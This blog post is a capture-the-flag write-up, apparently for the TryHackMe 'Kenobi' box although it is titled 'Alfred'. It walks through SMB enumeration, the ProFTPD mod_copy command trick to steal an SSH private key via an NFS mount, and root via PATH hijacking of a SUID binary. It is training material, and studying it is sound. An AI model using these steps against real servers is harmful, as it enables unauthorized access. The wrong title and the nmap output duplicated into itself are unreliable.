---
layout: post
title: Pentesting&#58; TryHackMe/Alfred
---

## TryHackMe: Alfred Write-up

This was a super fun box that leveraged a misconfiguration with SMB and a vulnerable version of ProFtpd.

### Enumeration

##### nmap

```
# Nmap 7.92 scan initiated Fri Sep 30 20:16:49 2022 as: nmap -sC -sV -oN initial.txt 10.10.204.190
Nmap scan report for 10.10.204.190
Host is up (0.16s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      44836/udp   mountd
|   100005  1,2,3      49445/udp6  mountd
|   100005  1,2,3      54055/tcp6  mountd
|   100005  1,2,3      58103/tcp   mountd
|   100021  1,3,4      33903/tcp6  nlockmgr
|   100021  1,3,4      38145/tcp   nlockmgr
|   100021  1,3,4      47339/udp   nlockmgr
|   100021  1,3,4      50697/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
| smb2-security-mode: 
|   3.1.1: # Nmap 7.92 scan initiated Fri Sep 30 20:16:49 2022 as: nmap -sC -sV -oN initial.txt 10.10.204.190
Nmap scan report for 10.10.204.190
Host is up (0.16s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      44836/udp   mountd
|   100005  1,2,3      49445/udp6  mountd
|   100005  1,2,3      54055/tcp6  mountd
|   100005  1,2,3      58103/tcp   mountd
|   100021  1,3,4      33903/tcp6  nlockmgr
|   100021  1,3,4      38145/tcp   nlockmgr
|   100021  1,3,4      47339/udp   nlockmgr
|   100021  1,3,4      50697/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
​
Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-10-01T03:17:12
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-09-30T22:17:12-05:00
​
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 30 20:17:18 2022 -- 1 IP address (1 host up) scanned in 29.25 seconds
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-10-01T03:17:12
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-09-30T22:17:12-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 30 20:17:18 2022 -- 1 IP address (1 host up) scanned in 29.25 seconds
```
##### SMB
```
# Nmap 7.92 scan initiated Fri Sep 30 20:18:53 2022 as: nmap -Pn -sV -p 445 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args=unsafe=1 -oN tcp_445_smb_nmap.txt 10.10.204.190
Nmap scan report for 10.10.204.190
Host is up (0.16s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: KENOBI

Host script results:
| smb-enum-sessions: 
|_  <nobody>
| smb-enum-domains: 
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   KENOBI
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
| smb-mbenum: 
|   DFS Root
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Master Browser
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Print server
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Server
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Server service
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Unix server
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Windows NT/2000/XP/2003 server
|     KENOBI  0.0  kenobi server (Samba, Ubuntu)
|   Workstation
|_    KENOBI  0.0  kenobi server (Samba, Ubuntu)
| smb-ls: Volume \\10.10.204.190\anonymous
| SIZE   TIME                 FILENAME
| <DIR>  2019-09-04T10:49:09  .
| <DIR>  2019-09-04T10:56:07  ..
| 12237  2019-09-04T10:48:17  log.txt
|_
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-09-30T22:19:00-05:00
|_smb-vuln-ms10-061: false
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.204.190\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 3
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.204.190\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.204.190\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb2-capabilities: 
|   2.0.2: 
|     Distributed File System
|   2.1: 
|     Distributed File System
|     Multi-credit operations
|   3.0: 
|     Distributed File System
|     Multi-credit operations
|   3.0.2: 
|     Distributed File System
|     Multi-credit operations
|   3.1.1: 
|     Distributed File System
|_    Multi-credit operations
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
|_smb-print-text: false
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-10-01T03:19:00
|_  start_date: N/A
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 30 20:24:30 2022 -- 1 IP address (1 host up) scanned in 337.34 seconds
```

##### RPC
```
# Nmap 7.92 scan initiated Fri Sep 30 20:43:21 2022 as: nmap -p 111 -oN rpc.txt --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.204.190
Nmap scan report for 10.10.204.190
Host is up (0.16s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

# Nmap done at Fri Sep 30 20:43:23 2022 -- 1 IP address (1 host up) scanned in 1.60 seconds
```

### Foothold

##### SMB

The SMB server in this case is a Samba server. Samba allows users on a company intranet or another type of semi-private intranet the ability to share files. This is why it is commonly referred to as a network file system. Since SMB is only developed for windows, Samba allows users on other operating systems (like Linux and other Unix OS's) to be a part of the network file system.

SMB is always a prime target for gaining entry on a box. Through enumeration we found 3 shares on the target. One of the found shares is an anonymous share, which should be accessible without authenticating to the server. Just use the command below and enter a blank password.
```
smbclient //10.10.204.190/anonymous
```

Using ls, we find an interesting filed named "log.txt". If we use the help command, we can find a list of commands supported by this server. We can use the get command to transfer the log.txt file to our machine for viewing. For the sake of learning, we will use the smbget command to recursively download the smb share to our machine.
```
smbget -R smb://10.10.204.190/anonymous
```

Now we can cat out the file on our target which provides a whole host of information. It looks to be a proFTPD config file. There are two notable things found: Information on the proftpd server and the ssh key generated for the kenobi user.
```
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+
```

##### ProFtpd

To start, we can search for vulnerabilities in the proftpd version number.
```
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)          | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)            | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                          | linux/remote/36742.txt
------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

There are three RCE exploits leveraging the mod_copy module. This module implements the SITE SPFR and SITE CPTO commands which copy files from one place in the file system to another without needing to transfer them to a client and back (more info here: http://www.proftpd.org/docs/contrib/mod_copy.html).

From the log.txt file earlier, we know that the FTP service is running with kenobi as the user and we also know that an ssh key was generated for that user. We can use the SITE CPFR and SIDE CPTO commands to get that ssh key.
```
─$ nc 10.10.213.160 21                       
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.213.160]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Here we were able to use netcat to connect to the ftp server on port 21. Using the SITE CPFR command, we can copy the file path we found in the log.txt file. Next we need to copy the file to the mountable directory we found when we enumerated rpcbind port 111. Now we need to mount the directory to our machine.
```
mkdir mnt
sudo mount 10.10.213.160:/var mnt
```

We can now view the rsa key in the tmp directory. First, make sure you copy the rsa key out of the mount directory and change the permissions. We can use this to connect to the target via ssh.
```
sudo chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.213.160
```

### Privilege Escalation

##### SUID/SGID/Sticky

SUID (Set User ID), SGID (Set Group ID), and sticky bits are permission identifiers with special meaning.

* SUID
  * On files: User executes with permission of the file owner
  * On directories: N/A

* SGID 
  * On files: User executes with permissions of the group owner
  * On directories: Files created in the directory get the same group number

* Sticky Bit
  * On files: N/A
  * On directories: Users are prevented from deleting files from other users.

These bits can be found in permission indicator strings with the first capital S signifying SUID,  the second capital S signifying SGID, and a capital T signifying sticky bit. The following example has all three bits set:
```
rwSrwSrwT
```

We can view these types of files, we can use the following command.
```
find / -perm -u=s -type f 2>/dev/null
```

Here we can see a list of files with these special permissions. We find one particularly interesting binary file called /usr/bin/menu.
```
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

When we run the binary, we get three options.
```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

Lets use the strings command to see view any human readable strings in the binary. This might give us a clue as to what the binary is doing under the hood.
```
strings /usr/bin/menu

** Enter your choice :
curl -I localhost
uname -r
ifconfig
```

The first option in the menu is running curl as a command in a SUID that is owned by root. This means we can copy a shell program, rename it curl, and the SUID file will run it as root. In this case, we can rename a shell script, call it curl, and have it execute as root, thus giving us root priviledge. Make sure to give the copied curl file 777 permissions so anyone and everyone can read, write, and execute.
```
echo /bin/sh > curl
chmod 777 curl
```

Now we need its location to our path.
```
export PATH=~:$PATH
```

Lets run /usr/bin/menu again and select option 1.
```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

We have successfully gained root.




